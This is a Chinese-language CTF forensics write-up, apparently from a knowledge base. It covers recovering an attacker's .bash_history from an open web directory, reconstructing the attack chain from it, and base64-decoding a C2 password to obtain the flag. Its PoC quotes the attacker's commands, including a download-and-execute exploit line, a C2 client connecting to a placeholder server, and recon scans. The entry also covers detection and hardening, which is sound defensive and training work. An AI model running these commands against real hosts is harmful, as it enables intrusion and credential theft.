---
id: ctf-forensics-web-open-dir-bash-history-ttp-replay
title: Web 开放目录泄露 .bash_history：从命令历史还原攻击者 TTP 并取出 base64 编码的 C2 凭据
type: scenario
domain: ctf
path: ctf/forensics
technique: bash-history-open-directory-attacker-ttp-replay
aliases:
- .bash_history 取证
- 开放目录泄露命令历史
- 命令历史还原攻击链
- C2 口令 base64 编码
- 渗透痕迹复盘
tags:
- forensics
- bash-history
- open-directory
- c2
- ttp
- base64
- incident-response
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:36:47+08:00'
  notes: 已对照原文核对；本次核对未读取图片；开放目录可下载 .bash_history、历史中 nmap/gobuster/nikto/sqlmap/searchsploit/EXP 下载执行/c2client --server --port --user --password 的命令序列，以及对 password 做 base64 得 flag，均与正文一致；历史全文只在正文引用的代码块中，flag 具体值仅在截图中未验证
---

## 一句话结论

Web 服务器把用户主目录或站点目录开成可浏览列表时，`.bash_history` 往往一起被下载；这份文件按时间记录了攻击者的完整操作序列（侦察 → 漏洞利用 → 上线 C2 → 上马 → 清理），既是最直接的 TTP 复盘材料，也常因为命令行里带着明文口令/密钥（有时只做了 base64）而直接泄露凭据。

## 原理

- `.bash_history` 是 bash 在交互式会话结束时（或 `history -a`）写入的纯文本，逐行保存用户输入的命令，默认位于用户主目录（`~/.bash_history`），受 `HISTFILE`/`HISTSIZE` 控制。
- 目录列表功能（nginx autoindex、Apache `Options +Indexes`、IIS 目录浏览，或应用自身的文件管理接口）会列出该目录下**所有**文件，包括以点开头的隐藏文件；`curl`/浏览器直接请求即可拿到全文，无需任何认证。
- 命令历史的信息密度极高：扫描器与参数（`nmap`、`gobuster`、`nikto`）、漏洞利用方式（`searchsploit`、下载 EXP、`curl .../exploit`）、外联基础设施（`wget` C2 客户端、`--server`/`--port`/`--user`/`--password`）、权限维持（写 webshell、复制脚本到 web 目录）。按行序读就是一条完整时间线。
- 口令常以两种形式出现：明文（历史里直接可见）或轻编码（base64/hex/URL 编码）。攻击者以为"不是明文"就够了，因此对可疑参数做一次 base64 解码往往直接得到凭据甚至 flag。
- 取证价值与攻击价值是同一份数据的两面：蓝队拿它做 IOC 提取与横向排查，红队/CTF 拿它当"被泄露的作战日志"。要注意历史文件可能被 `HISTFILE=/dev/null`、`unset HISTFILE`、`history -c` 或 `shred` 清理，缺失本身就是一种痕迹。

## 触发条件

- 目标 Web 服务或文件管理接口对目录开启了列表功能，且未限制点文件（`.` 开头）访问。
- 攻击者在目标主机上使用交互式 bash 执行过命令，且未关闭历史记录。
- 存在可下载该文件的 HTTP 路径（`/.bash_history`、`/~user/.bash_history`、应用文件接口的对应路径）。

## 利用步骤

1. 访问疑似开放目录的 URL，确认返回文件列表；重点看 `.bash_history`、`.bashrc`、`.ssh/`、`.git/`、`.env`、备份文件。
2. 直接请求该文件并保存为纯文本；若目录列表被禁止但文件名可猜，仍可尝试直接 GET。
3. 按行序通读，把命令分组成阶段：侦察（nmap/gobuster/nikto）、利用（searchsploit、EXP 下载与执行）、C2（客户端下载、`--server/--port/--user/--password`）、权限维持（上传脚本、写 web 目录）。
4. 对命令行里的可疑字符串逐个做编码尝试：base64、hex、URL decode；命中的口令用 `--show`/手工核对是否可读。
5. 用提取到的凭据与 C2 地址做两件事：CTF 里直接取 flag；真实场景里作为 IOC 排查横向与其他失陷主机。
6. 顺带确认是否还有 `.mysql_history`、`.python_history`、`.wget-hsts`、`authorized_keys`、`crontab` 等同源痕迹。

## PoC

```text
# 目录列表里直接出现：
.bash_history
nmap_scan_results.txt
dirs.txt
target.txt
exploit.sh
c2client
vulnmap-linux.py
```

```bash
# 直接取历史文件
curl -s http://target/.bash_history -o hist.txt
```

```text
# 历史中出现的典型阶段（节选语义）
nmap -sC -sV ... jackcolt.dev
gobuster dir -u http://jackcolt.dev -w ... -x php
searchsploit apache 2.4.49
wget https://.../50383 -O exploit.sh && ./exploit target.txt /bin/sh whoami
wget https://.../c2client -O c2client
./c2client --server 'https://<c2>' --port 4444 --user admin --password <BASE64>
cp vulnmap-linux.py /var/www/html
```

```python
# 命令行里"看似不可读"的口令先试一次 base64
import base64
print(base64.b64decode("<BASE64>").decode())   # 命中即得凭据/flag
```

## 变体与关联

- 变体（同源泄露文件）：`.zsh_history`、`.mysql_history`、`.python_history`、`.viminfo`、`.ssh/authorized_keys`（可反推攻击者公钥）、`.git/config`（含带凭据的远端 URL）。
- 变体（无历史文件）：被 `history -c`/`HISTFILE=/dev/null` 清理时，改看进程审计（`auditd`）、web 访问日志里的 EXP 请求、`/tmp` 下残留的 EXP/C2 二进制、`/var/www/html` 中新增的脚本。
- 变体（编码层数）：口令可能多重编码（base64 → URL encode → 反转），先剥一层再看结构特征（等号补位、仅含 `A-Za-z0-9+/`）。
- 关联：[[ctf-forensics-pcap-shell-history-base64-nc-image-exfil]]（流量里还原 shell 历史）、[[ctf-forensics-http-unauth-api-audit]]（从访问日志还原攻击行为）、[[ctf-misc-osint-cross-platform-username-steam-former-name]]（同类"公开信息反查"思路）。
- 边界：历史文件是**交互式 shell** 的记录，脚本执行、反弹 shell 内执行的命令不一定记录；也不包含时间戳（除非 `HISTTIMEFORMAT` 生效），时间线需要靠文件 mtime 与日志交叉。

## 检测与防御

- 修复：关闭目录列表（nginx `autoindex off`、Apache `Options -Indexes`、IIS 关闭目录浏览）；禁止通过 Web 访问点文件与 `.git`/`.env`/备份目录。
- 加固：Web 根目录与用户主目录分离，站点运行账户不使用交互式 shell（`/usr/sbin/nologin`）；生产主机不保留交互 shell 历史，或集中审计到远端日志。
- 检测：访问日志中出现 `/.bash_history`、`/.git/`、`/.env`、`/~*/.bash_history` 的 GET；目录列表响应体积异常；随后出现来自同一 IP 的凭据爆破或 C2 外连。
- 审计：定期扫描 Web 根目录是否存在点文件与备份文件；把"开放目录"纳入配置基线检查。
